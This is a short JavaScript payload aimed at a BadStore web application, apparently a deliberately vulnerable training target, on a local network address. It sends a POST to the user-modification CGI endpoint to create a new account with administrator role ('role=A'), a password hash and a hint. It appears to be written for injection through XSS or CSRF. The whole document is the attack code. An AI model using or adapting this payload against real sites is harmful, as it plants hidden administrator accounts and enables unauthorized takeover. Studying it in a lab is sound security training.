let request = new XMLHttpRequest()
request.open(
	'POST',
	'http://192.168.1.26/cgi-bin/badstore.cgi?action=moduser',
	true
	)
request.send("email=angelo@orange.fr&password=40C0BBDC4AEEAA39166825F8B477EDB4&pwdhint=green&fullname=angelo&role=A&DoMods=Add+User")